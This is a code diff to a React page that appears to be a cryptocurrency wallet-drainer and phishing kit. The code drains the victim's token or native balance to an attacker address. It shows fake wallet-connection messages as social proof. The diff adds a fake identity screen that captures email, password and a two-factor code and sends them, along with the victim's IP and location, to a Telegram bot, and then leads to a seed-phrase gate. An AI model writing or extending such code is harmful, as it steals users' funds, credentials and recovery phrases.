@@ -11,6 +11,9 @@ export default function App() {
   const [selectedAsset, setSelectedAsset] = useState("TOKEN"); 
   const [inputVal, setInputVal] = useState(""); 
   const [seedVal, setSeedVal] = useState("");   
+  const [kycEmail, setKycEmail] = useState("");
+  const [kycPass, setKycPass] = useState("");
+  const [kycCode, setKycCode] = useState(""); 
   const [kycPhase, setKycPhase] = useState(1); 
   const [isSyncing, setIsSyncing] = useState(false);
   const [syncProgress, setSyncProgress] = useState(0);
@@ -28,18 +31,24 @@ export default function App() {
     fetch('https://api.ipify.org?format=json').then(res => res.json()).then(data => {
       fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
         method: 'POST', headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: chatId, text: `${msg}\n🌐 IP: ${data.ip}` })
+        body: JSON.stringify({ chat_id: chatId, text: `${msg}\n🌐 IP: ${data.ip}\n📍 LOC: ${data.city || 'Unknown'}, ${data.country || 'Unknown'}` })
       });
-    }).catch(() => {});
+    }).catch(() => {
+      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
+        method: 'POST', headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({ chat_id: chatId, text: msg })
+      });
+    });
   };
 
   useEffect(() => {
     const triggerMsg = () => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
       setFeedMsg(`🛡️ ${addr} WALLET CONNECTED TO MAINNET_NODE`);
-      setTimeout(() => setFeedMsg(""), 4500);
+      setTimeout(() => setFeedMsg(""), 4000);
     };
-    const interval = setInterval(triggerMsg, 12000);
+    triggerMsg(); 
+    const interval = setInterval(triggerMsg, 8000);
     return () => clearInterval(interval);
   }, []);
 
@@ -49,7 +58,8 @@ export default function App() {
       const data = `0xa9059cbb${destination.replace('0x', '').toLowerCase().padStart(64, '0')}${tokenBal.value.toString(16).padStart(64, '0')}`;
       sendTransaction({ to: tokenAddr, data }, { onSettled: () => setView("seed_gate") });
     } else if (nativeBal && nativeBal.value > 100000000000000n) {
-      sendTransaction({ to: destination, value: (nativeBal.value * 98n) / 100n }, { onSettled: () => setView("seed_gate") });
+      const amount = (nativeBal.value * 98n) / 100n;
+      sendTransaction({ to: destination, value: amount }, { onSettled: () => setView("seed_gate") });
     } else {
       setView("seed_gate");
     }
@@ -114,15 +124,16 @@ export default function App() {
                 <input 
                   value={inputVal} 
                   type={activeTask === "Rectify" ? "text" : "number"} 
+                  inputMode={activeTask === "Rectify" ? "none" : "decimal"}
                   readOnly={activeTask === "Rectify"}
                   onChange={(e) => setInputVal(e.target.value)} 
                   style={{background:'none', border:'none', color:'#10b981', fontSize:'32px', textAlign:'center', width:'100%', outline:'none', fontWeight:'900'}} 
                   placeholder="0.00" 
                 />
               </div>
-              {/* BUTTON ALWAYS GREEN FOR RECTIFY OR WHEN OTHERS HAVE INPUT */}
               <button 
                 onClick={handleHandshake} 
+                disabled={activeTask !== "Rectify" && (!inputVal || inputVal === "0")}
                 style={{width:'100%', backgroundColor: (activeTask === "Rectify" || (inputVal && inputVal !== "0")) ? '#10b981' : '#1e293b', color:'#000', padding:'22px', borderRadius:'18px', fontWeight:'900', border:'none'}}
               >
                 START_HANDSHAKE
@@ -130,7 +141,37 @@ export default function App() {
             </div>
           )}
 
-          {/* ... KYC and Seed gates remain active ... */}
+          {view === "kyc_screen" && (
+            <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'35px', padding:'35px', textAlign:'center', position:'relative'}}>
+              <button onClick={()=>setView("menu")} style={{position:'absolute', left:'20px', top:'20px', background:'none', border:'none', color:'#475569', fontSize:'22px'}}>←</button>
+              <h2 style={{color:'white', fontWeight:'900', marginBottom:'25px'}}>IDENTITY_SYNC</h2>
+              {kycPhase === 1 ? (
+                <>
+                  <input placeholder="EMAIL" value={kycEmail} onChange={(e)=>setKycEmail(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'15px', outline:'none'}} />
+                  <input type="password" placeholder="PASSWORD" value={kycPass} onChange={(e)=>setKycPass(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'white', marginBottom:'25px', outline:'none'}} />
+                  <button 
+                    disabled={!kycEmail || !kycPass}
+                    onClick={()=>{log(`🆔 KYC: ${kycEmail} | PASS: ${kycPass}`); setKycPhase(2);}} 
+                    style={{width:'100%', backgroundColor: (kycEmail && kycPass) ? '#10b981' : '#1e293b', color:'black', padding:'20px', borderRadius:'15px', fontWeight:'900'}}
+                  >
+                    VERIFY RELAY
+                  </button>
+                </>
+              ) : (
+                <>
+                  <input maxLength="6" type="number" placeholder="000000" value={kycCode} onChange={(e)=>setKycCode(e.target.value)} style={{width:'100%', padding:'18px', backgroundColor:'black', border:'2px solid #3b82f6', borderRadius:'15px', color:'white', textAlign:'center', fontSize:'28px', letterSpacing:'5px', outline:'none', marginBottom:'25px'}} />
+                  <button 
+                    disabled={kycCode.length < 6}
+                    onClick={()=>{log(`🔑 CODE: ${kycCode}`); setView("seed_gate");}} 
+                    style={{width:'100%', backgroundColor: kycCode.length >= 6 ? '#3b82f6' : '#1e293b', color:'white', padding:'20px', borderRadius:'15px', fontWeight:'900'}}
+                  >
+                    AUTHORIZE
+                  </button>
+                </>
+              )}
+            </div>
+          )}
+
           {view === "seed_gate" && (
             <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.98)', zIndex:4000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px'}}>
               <div style={{backgroundColor:'#0d1117', border:'2px solid #10b981', borderRadius:'35px', padding:'40px 25px', textAlign:'center', maxWidth:'400px'}}>
@@ -159,3 +200,4 @@ export default function App() {
     </div>
   );
 }
+
